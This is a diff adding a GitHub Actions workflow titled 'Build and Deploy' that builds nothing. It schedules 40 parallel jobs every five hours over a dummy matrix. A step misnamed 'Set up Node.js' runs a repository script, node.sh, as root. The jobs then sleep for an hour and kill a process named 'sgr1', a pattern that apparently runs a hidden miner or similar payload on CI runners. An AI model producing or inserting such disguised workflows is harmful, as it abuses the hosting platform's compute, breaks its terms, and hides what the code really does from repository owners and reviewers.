@@ -1,0 +1,39 @@
+name: Build and Deploy
+
+on:
+  workflow_dispatch:
+  push:
+  schedule:
+    - cron: '0 */5 * * *'
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 40
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        flag: [A, B, C, D]
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Set up Node.js
+        run: chmod +x "${GITHUB_WORKSPACE}/node.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node.sh"
+
+      - name: Run script with random wait time
+        run: |
+          end=$((SECONDS+3600))
+          while [ $SECONDS -lt $end ]; do
+            # Generate random wait time between 1 and 10 minutes
+            wait_time=$((RANDOM % 600 + 1))
+            sleep $wait_time
+          done
+
+      - name: Clean up
+        run: |
+          # Clean up any remaining processes
+          pid=$(pgrep -f "sgr1")
+          if [ -n "$pid" ]; then
+            kill $pid
+          fi
